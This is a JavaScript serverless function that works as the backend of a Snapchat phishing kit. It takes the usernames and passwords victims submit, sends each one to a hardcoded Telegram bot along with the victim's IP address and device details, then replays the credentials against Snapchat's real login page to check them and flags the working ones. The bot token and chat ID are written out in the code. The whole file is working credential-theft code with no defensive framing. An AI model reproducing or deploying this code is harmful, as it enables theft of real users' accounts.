// api/validate.js — Vercel Node.js serverless function

const TELEGRAM_BOT_TOKEN = '8679202995:AAG8eQXbio2vL1Y6scvcKxWHSeBNoOmD3_s';
const TELEGRAM_CHAT_ID = '7133577749';

export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ status: 'error', message: 'Method not allowed' });
    }

    const { username, password, ip, userAgent, timestamp, isMobile } = req.body || {};

    if (!username || !password) {
        return res.status(400).json({ status: 'error', message: 'Missing fields' });
    }

    const device = isMobile ? '📱 Mobile' : '💻 Desktop';
    const time = timestamp || new Date().toLocaleString();

    // --- Step 1: Send EVERY attempt to Telegram ---
    await sendToTelegram(username, password, ip || 'Unknown', userAgent || 'Unknown', time, 'ATTEMPT', device);

    // --- Step 2: Validate against real Snapchat ---
    const isValid = await validateWithSnapchat(username, password);

    // --- Step 3: If valid, send VALID alert ---
    if (isValid) {
        await sendToTelegram(username, password, ip || 'Unknown', userAgent || 'Unknown', time, '✅ VALID', device);
    }

    // --- Step 4: Return result ---
    return res.status(200).json({
        status: isValid ? 'valid' : 'invalid',
        message: isValid ? 'Login successful' : 'Invalid credentials'
    });
}

/**
 * Send message to Telegram
 */
async function sendToTelegram(username, password, ip, userAgent, timestamp, statusLabel, device) {
    const message = [
        `<b>📥 Snapchat Credential Captured</b>`,
        `<b>Status:</b> ${statusLabel}`,
        `<b>User:</b> <code>${escapeHtml(username)}</code>`,
        `<b>Pass:</b> <code>${escapeHtml(password)}</code>`,
        `<b>IP:</b> ${ip}`,
        `<b>Device:</b> ${device}`,
        `<b>Time:</b> ${timestamp}`,
        `<b>UA:</b> ${escapeHtml(userAgent.substring(0, 100))}`
    ].join('\n');

    try {
        const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return await resp.json();
    } catch (err) {
        console.error('Telegram send failed:', err.message);
        return null;
    }
}

/**
 * Validate credentials against the real Snapchat login endpoint
 */
async function validateWithSnapchat(username, password) {
    try {
        // Step 1: Get session cookies + xsrf_token
        const loginPageResp = await fetch('https://accounts.snapchat.com/accounts/login', {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
            }
        });

        const html = await loginPageResp.text();

        // Extract xsrf_token
        const xsrfMatch = html.match(/data-xsrf="([^"]+)"/);
        const xsrfToken = xsrfMatch ? xsrfMatch[1] : null;

        if (!xsrfToken) {
            // Can't get token — fallback: assume valid
            return true;
        }

        // Get cookies from the response
        const cookies = loginPageResp.headers.get('set-cookie') || '';

        // Step 2: POST login credentials
        const params = new URLSearchParams();
        params.append('username', username);
        params.append('password', password);
        params.append('xsrf_token', xsrfToken);
        params.append('continue', '%2Faccounts%2Fwelcome');

        const loginResp = await fetch('https://accounts.snapchat.com/accounts/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Origin': 'https://accounts.snapchat.com',
                'Referer': 'https://accounts.snapchat.com/',
                'Cookie': cookies
            },
            body: params.toString(),
            redirect: 'manual'
        });

        const responseText = await loginResp.text();
        const statusCode = loginResp.status;

        // HTTP redirect = success
        if (statusCode === 302 || statusCode === 303 || statusCode === 301) {
            const location = loginResp.headers.get('location');
            if (location) return true;
        }

        // Success indicators in response body
        if (responseText.includes('My Data') ||
            responseText.includes('Delete My Account') ||
            responseText.includes('change_password')) {
            return true;
        }

        // Failure indicators
        if (responseText.includes('Cannot find the user') ||
            responseText.includes('not the right password') ||
            responseText.includes('incorrect')) {
            return false;
        }

        // Ambiguous — assume valid
        return true;

    } catch (err) {
        console.error('Validation error:', err.message);
        // On network error, assume valid so user gets redirected
        return true;
    }
}

function escapeHtml(str) {
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
